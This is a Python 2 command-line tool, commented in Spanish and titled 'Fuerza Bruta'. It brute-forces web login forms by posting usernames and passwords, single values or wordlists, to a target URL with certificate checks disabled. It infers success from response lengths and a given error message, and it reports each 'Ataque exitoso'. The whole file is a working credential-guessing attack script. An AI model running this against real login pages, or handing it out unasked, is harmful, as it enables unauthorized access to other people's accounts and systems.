#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path
from termcolor import colored

arg = ''
url = ''
userField = ''
passField = ''
user = ''
pwd = ''
userFile = ''
pwdFile = ''
message = ''
	

	
def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	
	payload = { userField : user, passField: pwd}
	r = requests.post(url, payload, verify=False)

	if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	
	elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
		if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
		
		
def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)

	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd}
			r = requests.post(url, data= payload, verify=False)
			
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
				if int(len(r.content)) == int(len(reqadm1.content)) or mbefore in r.content:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	passwords = []
	
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')}
			r = requests.post(url, data= payload, verify=False)
			
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
			
			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
				if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')

	
def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	passwords = []
	i = 0
	j = 0
	
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				r = requests.post(url, data= payload, verify=False)
			
				if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						
						j + 1
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1
						
				elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
					if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						j + 1
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
		i + 1	
	
def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
	parser.add_argument('-f','--field', help = 'User and Password Field separated by space', required=True, nargs=2)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
	
	options = parser.parse_args()
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
		doubleFile(options.bruteforce,options.field[0],options.field[1],'','',options.users,options.passwords,options.message)
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		pwdFile(options.bruteforce,options.field[0],options.field[1],options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		usersFile(options.bruteforce,options.field[0],options.field[1],'',options.password,options.users,'',options.message)
	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		single(options.bruteforce,options.field[0],options.field[1],options.user,options.password,'','',options.message)
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()

		
getParams(arg)
